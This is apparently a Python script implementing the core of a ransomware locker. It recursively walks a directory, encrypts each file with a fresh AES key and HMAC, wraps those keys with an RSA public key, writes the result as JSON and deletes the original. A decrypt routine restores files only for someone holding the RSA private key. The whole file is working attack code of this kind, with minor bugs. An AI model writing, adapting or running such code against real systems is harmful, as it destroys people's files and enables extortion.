from base64 import b64encode, b64decode
import encryption, constants, os, json, cryptools, sys

target_folder = input('[*] Input Path To Root Directory To Start Encrypting: ')

def main():

	if os.path.isdir(target_folder):

		if sys.argv[1] == '1':
			EncryptFolder(target_folder)


		else:
			DecryptFolder(target_folder)
	
	else:

		print 'File Does Not Exist'


def EncryptFolder(folder_path):

	rsa_cipher = encryption.AsymmetricCipher(constants.RSA_FOLDER_PATH)

	for current_directory, sub_directories, sub_files in os.walk(folder_path):

		for file in sub_files:

			if len(file.split('.')) == 0:
				continue

			json_dict = dict()

			ext = file.split('.')[-1]

			fileName = ''.join(file.split('.')[:-1])

			aes_key = os.urandom(constants.AES_KEY_LENGTH)

			aes_iv = os.urandom(constants.IV_LENGTH)

			aes_cipher = encryption.SymmetricCipher(aes_key, aes_iv)

			hmac_key = os.urandom(constants.HMAC_KEY_LENGTH)

			with open(os.path.join(current_directory, file), 'rb') as f:
				ciphertext = aes_cipher.Encrypt(f.read())

			tag = cryptools.HMAC(ciphertext, hmac_key)

			encrypted_keys = rsa_cipher.Encrypt(aes_key + hmac_key)


			json_dict['IV'] = b64encode(aes_iv)
			json_dict['KEY'] = b64encode(encrypted_keys)
			json_dict['TAG'] = b64encode(tag)
			json_dict['EXT'] = b64encode(ext)
			json_dict['CIPHER'] = b64encode(ciphertext)

			with open(os.path.join(current_directory, fileName + '.json'), 'w') as json_file:
				json.dump(json_dict, json_file)

			os.remove(os.path.join(current_directory, file))
			print('\n[+] Encrypting %s\n' % os.path.join(current_directory, file))


def DecryptFolder(folder_path):

	rsa_cipher = encryption.AsymmetricCipher(constants.RSA_FOLDER_PATH)

	for current_directory, sub_directories, sub_files in os.walk(folder_path):

		for file in sub_files:
			if 'json' not in file:
				continue
			with open(os.path.join(current_directory, file), 'r') as js:
				json_dict = json.load(js)

			fileName = ''.join(file.split('.')[:-1])

			tag = b64decode(json_dict['TAG'])

			cipherkeys = b64decode(json_dict['KEY'])

			ciphertext = b64decode(json_dict['CIPHER'])

			concatenated_keys = rsa_cipher.Decrypt(cipherkeys)

			aes_key, hmac_key = (concatenated_keys[:constants.AES_KEY_LENGTH], concatenated_keys[constants.AES_KEY_LENGTH:])

			aes_iv = b64decode(json_dict['IV'])

			ext = b64decode(json_dict['EXT'])

			aes_cipher = encryption.SymmetricCipher(aes_key, aes_iv)

			if cryptools.HMAC(ciphertext, hmac_key) != tag:
				print('Ciphertext has been changed for %s ', file)

			with open(os.path.join(current_directory, fileName + '.' + ext), 'wb') as f:
				f.write(aes_cipher.Decrypt(ciphertext))

			print('\n[+] Decrypting %s\n' % os.path.join(current_directory, fileName + '.' + ext))

			os.remove(os.path.join(current_directory, file))





if __name__ == '__main__':
	main()